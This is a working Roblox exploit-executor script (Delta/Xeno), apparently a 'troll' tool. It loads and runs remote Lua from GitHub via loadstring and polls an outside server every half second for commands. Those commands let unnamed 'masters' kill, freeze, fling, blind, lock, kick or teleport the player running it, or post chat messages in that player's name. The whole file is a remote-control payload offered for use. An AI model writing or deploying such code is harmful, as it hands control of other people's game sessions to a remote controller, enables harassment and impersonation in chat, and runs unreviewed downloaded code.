--[[
    Troller Commands Script (MODO NUBE - Delta / Xeno)
    Actualizado para la nueva estructura JSON del servidor y filtros de alcance.
]]

if _G.__TrollerRunning then
    warn("[Troller] El script ya está en ejecución. Abortando duplicado.")
    return
end
_G.__TrollerRunning = true

local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local TextChatService   = game:GetService("TextChatService")
local Debris            = game:GetService("Debris")
local TeleportService   = game:GetService("TeleportService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local PREFIX = "."
local NO_TARGET = "@@NONE@@"

-- URL de tu servidor en Bot-Hosting
local SERVER_URL = "https://sbxx2o7cud.apps.bot-hosting.cloud"

local MASTERS_URL = "https://raw.githubusercontent.com/brsfjgh/prove/refs/heads/main/master.lua"
local ADMINS_URL  = "https://raw.githubusercontent.com/brsfjgh/prove/refs/heads/main/admin.lua"

local function loadListFromUrl(url)
    local ok, result = pcall(function()
        local source = game:HttpGet(url)
        local chunk = loadstring(source)
        if not chunk then error("Chunk error") end
        return chunk()
    end)
    if not ok or type(result) ~= "table" then return {} end
    return result
end

local MASTERS = loadListFromUrl(MASTERS_URL)
local ADMINS  = loadListFromUrl(ADMINS_URL)

local selfFrozen  = false
local selfBlinded = false
local selfBlocked = false

_G.TrollerSelfBlocked = false

local UNDO_REQUIRES_NICK = {
    unfr    = true,
    unblind = true,
    unblock = true,
}

local TEXT_COMMANDS = {
    say = true,
}

local function getPlayersByName(name)
    local lower = name:lower()
    local exact = {}
    local prefix = {}

    for _, p in ipairs(Players:GetPlayers()) do
        local pn = p.Name:lower()
        local dn = p.DisplayName:lower()

        if pn == lower or dn == lower then
            table.insert(exact, p)
        elseif pn:sub(1, #lower) == lower or dn:sub(1, #lower) == lower then
            table.insert(prefix, p)
        end
    end

    if #exact > 0 then return exact end
    return prefix
end

local function splitArgs(msg)
    local args = {}
    for word in msg:gmatch("%S+") do
        table.insert(args, word)
    end
    return args
end

local function parseTargetForCmd(args, cmdName)
    if not args[2] then return nil, 2 end
    local second = args[2]

    if second:sub(-1) == "." and #second > 1 then
        local name = second:sub(1, #second - 1)
        if #getPlayersByName(name) > 0 then
            return name, 3
        end
        return NO_TARGET, 2
    end

    if TEXT_COMMANDS[cmdName] then
        return nil, 2
    end

    if #getPlayersByName(second) > 0 then
        return second, 3
    end

    return NO_TARGET, 2
end

local function getLocalHumanoid()
    local char = LocalPlayer.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end

local function getLocalHRP()
    local char = LocalPlayer.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function freezeSelf()
    selfFrozen = true
    local hum = getLocalHumanoid()
    if hum then
        hum.WalkSpeed      = 0
        hum.JumpPower      = 0
        hum.JumpHeight     = 0
        hum.PlatformStand = true
    end
end

local function unfreezeSelf()
    selfFrozen = false
    local hum = getLocalHumanoid()
    if hum then
        hum.WalkSpeed      = 16
        hum.JumpPower      = 50
        hum.JumpHeight     = 7.2
        hum.PlatformStand = false
    end
end

local function killSelf()
    local hum = getLocalHumanoid()
    if hum then hum.Health = 0 end
end

local function flingSelf()
    pcall(function()
        local remote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("RagdollState")
        local args = { Vector3.new(541.3, 1002.5, -802.6), 5 }
        for i = 1, 2 do
            firesignal(remote.OnClientEvent, table.unpack(args))
            task.wait(0.05)
        end
    end)
end

local function flingSelf2()
    local hrp = getLocalHRP()
    if not hrp then return end
    hrp.CFrame = hrp.CFrame + Vector3.new(0, 7.5, 0)
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(150, 225), math.random(-50, 50))
    bv.Parent = hrp
    Debris:AddItem(bv, 0.125)
end

local function blindSelf()
    if selfBlinded then return end
    selfBlinded = true
    local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not guiParent then return end

    local blackScreenGui = Instance.new("ScreenGui")
    blackScreenGui.Name = "TrollerBlind"
    blackScreenGui.IgnoreGuiInset = true
    blackScreenGui.ResetOnSpawn = false
    blackScreenGui.DisplayOrder = 999

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Parent = blackScreenGui
    blackScreenGui.Parent = guiParent
end

local function unblindSelf()
    selfBlinded = false
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui")}) do
        if parent then
            local leftover = parent:FindFirstChild("TrollerBlind")
            if leftover then leftover:Destroy() end
        end
    end
end

local function blockSelf()
    if selfBlocked then return end
    selfBlocked = true
    _G.TrollerSelfBlocked = true
    local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not guiParent then return end

    local blockGui = Instance.new("ScreenGui")
    blockGui.Name = "TrollerBlock"
    blockGui.IgnoreGuiInset = true
    blockGui.ResetOnSpawn = false
    blockGui.DisplayOrder = 999

    local blockFrame = Instance.new("Frame")
    blockFrame.Size = UDim2.new(1, 0, 1, 0)
    blockFrame.BackgroundTransparency = 1
    blockFrame.Active = true
    blockFrame.Parent = blockGui
    blockGui.Parent = guiParent
end

local function unblockSelf()
    selfBlocked = false
    _G.TrollerSelfBlocked = false
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui")}) do
        if parent then
            local leftover = parent:FindFirstChild("TrollerBlock")
            if leftover then leftover:Destroy() end
        end
    end
end

-- Teletransporte: Tú vas hacia el objetivo (.t o .tp)
local function teleportSelfTo(targetPlayer)
    local myHRP = getLocalHRP()
    if not myHRP or not targetPlayer then return end
    local targetChar = targetPlayer.Character
    local targetHRP  = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
    if targetHRP then
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 0, 3)
    end
end

-- Bring (.b): El objetivo viene hacia ti
local function bringTargetToMaster(masterPlr)
    local myHRP = getLocalHRP()
    if not myHRP or not masterPlr then return end
    local masterChar = masterPlr.Character
    local masterHRP  = masterChar and masterChar:FindFirstChild("HumanoidRootPart")
    if masterHRP then
        myHRP.CFrame = masterHRP.CFrame * CFrame.new(0, 0, -3)
    end
end

local function applyCommandLocally(cmdName, text)
    if cmdName == "say" then
        if text and text ~= "" then
            pcall(function()
                TextChatService.TextChannels.RBXGeneral:SendAsync(text)
            end)
        end
    elseif cmdName == "kill"    then killSelf()
    elseif cmdName == "fr"      then freezeSelf()
    elseif cmdName == "unfr"    then unfreezeSelf()
    elseif cmdName == "fling"   then flingSelf()
    elseif cmdName == "fling2"  then flingSelf2()
    elseif cmdName == "blind"   then blindSelf()
    elseif cmdName == "unblind" then unblindSelf()
    elseif cmdName == "b"       then 
        for _, p in ipairs(Players:GetPlayers()) do
            for _, m in ipairs(MASTERS) do
                if p.UserId == m or p.Name:lower() == tostring(m):lower() then
                    bringTargetToMaster(p)
                    break
                end
            end
        end
    elseif cmdName == "block"   then blockSelf()
    elseif cmdName == "unblock" then unblockSelf()
    elseif cmdName == "rj"      then pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId) end)
    elseif cmdName == "kick"    then pcall(function() LocalPlayer:Kick("Expulsado.") end)
    elseif cmdName == "ban"     then pcall(function() LocalPlayer:Kick("Baneado.") end)
    end
end

-- ================== PROCESADOR DE NUBE ==================
local function processCloudCommand(data)
    local rawMsg = data.command
    if not rawMsg or rawMsg == "" then return end

    -- Filtrar si el comando es exclusivo para SERVER y el JobId no coincide
    if rawMsg:sub(1, 8) == "[SERVER]" then
        if data.jobId and data.jobId ~= "" and data.jobId ~= game.JobId then
            return -- Es para otro servidor, ignorar
        end
    end

    -- Limpiar prefijos de alcance ([GLOBAL] o [SERVER]) y el ID random de 5 dígitos (#XXXXX)
    local cleanMsg = rawMsg:gsub("^%[.-%]%s*", ""):gsub("%s*#%d+", "")

    if cleanMsg:sub(1, #PREFIX) ~= PREFIX then return end

    local body = cleanMsg:sub(#PREFIX + 1)
    local args = splitArgs(body)
    if #args == 0 then return end

    local cmdName = args[1]:lower()
    local targetName, restStart = parseTargetForCmd(args, cmdName)

    if targetName == NO_TARGET then return end
    if UNDO_REQUIRES_NICK[cmdName] and not targetName then return end

    local text = ""
    if #args >= restStart then
        text = table.concat(args, " ", restStart)
    end

    local iAmTarget = false
    if not targetName then
        iAmTarget = true
    else
        for _, p in ipairs(getPlayersByName(targetName)) do
            if p == LocalPlayer then
                iAmTarget = true
                break
            end
        end
    end
    if not iAmTarget then return end

    applyCommandLocally(cmdName, text)
end

-- ================== POLLING DE ALTA VELOCIDAD (0.5s) ==================
local lastFetchedTimestamp = 0

task.spawn(function()
    while true do
        local success, response = pcall(function()
            return game:HttpGet(SERVER_URL .. "/api/get-command")
        end)

        if success then
            local suc, data = pcall(function()
                return HttpService:JSONDecode(response)
            end)
            if suc and data and data.timestamp then
                if data.timestamp > lastFetchedTimestamp and data.command ~= "" then
                    lastFetchedTimestamp = data.timestamp
                    processCloudCommand(data)
                elseif data.command == "" then
                    lastFetchedTimestamp = data.timestamp
                end
            end
        end

        task.wait(0.5)
    end
end)
